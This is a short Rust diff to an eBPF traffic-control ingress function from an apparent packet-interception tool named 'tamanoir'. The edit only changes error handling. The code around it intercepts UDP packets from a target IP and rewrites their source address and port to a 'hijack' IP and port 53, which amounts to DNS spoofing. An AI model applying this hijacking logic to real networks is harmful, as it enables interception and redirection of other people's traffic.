@@ -20,18 +20,18 @@ pub fn tamanoir_ingress(mut ctx: TcContext) -> i32 {
 }
 
 #[inline]
-fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, ()> {
+fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
     let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
     let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
 
-    let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
+    let ethhdr: EthHdr = ctx.load(0)?;
     if let EtherType::Ipv4 = ethhdr.ether_type {
-        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
+        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN)?;
         let addr = header.src_addr;
         if let IpProto::Udp = header.proto {
             if u32::from_be(addr) == target_ip {
                 info!(ctx, "\n-----\nNew intercepted request:\n-----");
-                let udp_port = &ctx.load::<u16>(UDP_OFFSET).map_err(|_| ())?;
+                let udp_port = &ctx.load::<u16>(UDP_OFFSET)?;
                 update_addr(ctx, &addr, &hijack_ip.to_be(), UpdateType::Src)?;
                 update_port(ctx, udp_port, &53u16.to_be(), UpdateType::Src)?;
 
